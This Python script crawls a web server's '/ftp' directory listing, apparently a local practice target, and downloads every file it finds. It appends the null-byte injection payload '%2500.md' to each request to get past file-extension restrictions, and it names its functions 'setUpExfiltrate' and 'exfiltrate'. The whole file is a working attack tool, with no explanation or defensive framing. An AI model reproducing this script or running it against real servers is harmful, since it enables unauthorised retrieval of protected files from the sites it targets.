#!/usr/bin/env python3
import os
import requests
from bs4 import BeautifulSoup

""" Programming concept:
multithread, each thread handles one dir/subdir

target_dict = {root:[list of files], root/dir1:[list of files], root/dir2:[list of files]}
"""

# Methods Declaration
def addToDict(t_dict, t_key, t_value):
	t_dict[t_key] = t_value

def getDomain(url):
	domain = url.replace('/', ' ')
	domain = ' '.join(domain.split())
	domain = list(domain.split(" "))[1]
	return domain

def getProtocol(url):
	protocol = url.replace('/', ' ')
	protocol = ' '.join(protocol.split())
	protocol = list(protocol.split(" "))[0]
	return protocol

def getPath(url):
	protocolDomain = getProtocol(url) + '//' + getDomain(url) + '/'
	if protocolDomain in url:
		return url.replace(protocolDomain, '')
	else:
		return ""

def isDir(target, url):
	tempR = requests.get(url + '/' + target.text + '/')
	if tempR.status_code == 200:
		# current target is a URL
		#print(f"{target.text} is a directory")
		return True
	else:
		return False


""" USAGE of function
User supplied inputs:
	t_dict : master dict to store {dir:[list of targets], dir/subDir: [list of targets]...}
	t_dirList : [root, root/sub, root/sub/sub2 ...]
	t_url : `http://localhost.com/folder
Default:	
	t_tarList : default=[] BUT explicitly supply an empty list when recursive call
"""
def setUpExfiltrate(t_dict, t_dirList, t_url, t_tarList=[]):
	print(f"Current exfiltrating @ {t_url}")

	# currentDir = path of t_url
	currentDir = getPath(t_url)

	payload = '%2500.md'

	# Set up root folder by checking if dict is empty
	if not bool(t_dict):
		# Add this for root dir
		print(f"Root folder = {currentDir}/")

		addToDict(t_dict, currentDir, [])
		t_dirList.append(currentDir)
		print(f"t_dict = {t_dict}")
		print(f"t_dirList = {t_dirList}")
		print(f"t_tarList = {[t.text for t in t_tarList]}\n")

		print(f"############ Recursively exfiltrating : {t_url} ############\n")
		setUpExfiltrate(t_dict, t_dirList, t_url)

	else:
		# Get request
		r = requests.get(t_url)

		# See if soup can detect anything else stop
		soup = BeautifulSoup(r.text, 'lxml')
		# Make this dynamic, consider a third - fifth param tag_list, class_list, id_list
		t_tarList += soup.find_all('span', class_ = 'name')
		#targets = soup.find_all('span', class_ = 'name')
		
		# Base case/stop condition | check if tarList is empty
		if not t_tarList:
			print(f"No more target found...")
		else:
			for target in t_tarList:
				# Check for path back to parent
				if target.text == '..':
					continue
				else:
					print(f"Current pointing @ {t_url}")
					print(f"Target is {target.text}")
					if isDir(target, t_url) == True:
						# Update t_dict keys
						newKey = currentDir + '/' + target.text # currentDir/newKey
						addToDict(t_dict, newKey, [])
						# Append to dirList
						t_dirList.append(newKey + '/')
						t_tarList.remove(target)

						# Debugging console out
						print(f"Folder identified : {newKey}")
						# print(f"t_dict = {t_dict}")
						# print(f"t_dirList = {t_dirList}")
						# print(f"t_tarList = {[t.text for t in t_tarList]}\n")

						# RECURSIVE STEP
						print(f"============ Entering recursion @ {t_url}/{target.text} ============\n")
						r_tarList = [] # Setup an empty tarList for recursive call
						setUpExfiltrate(t_dict, t_dirList, t_url + '/' + target.text, r_tarList)
						print("################## Recursive exfiltrate done... ##################\n")
							
					else:
						# eg. t_dict[root/subdir1]
						#print(f"target is not file...\ndict[{currentDir}].append({target.text})")
						t_dict[currentDir].append(target.text)
						print(f"File/Non-Folder identified : {target.text}\n")


def exfiltrate(t_dict, url, payload):
	# Make Directory
	for directory in t_dict:
		os.makedirs(directory, exist_ok = True)

		# Download files
		for file in t_dict[directory]:
			f_req = requests.get(url + '/' + file + payload, allow_redirects = True)
			writePath = os.path.join(directory, file)
			open(writePath, 'wb').write(f_req.content)


# -------------------------------------------------------------

# MAIN LOOP

# User input temp variables
cur_path = os.getcwd()
folders = []
target_dict = {}

url = 'http://localhost:3000/ftp'

# Payload to append for null byte injection 
payload = '%2500.md'

# print(target_dict)

setUpExfiltrate(target_dict, folders, url)

exfiltrate(target_dict, url, payload)

print(f"\n{target_dict}")
print(f"{folders}")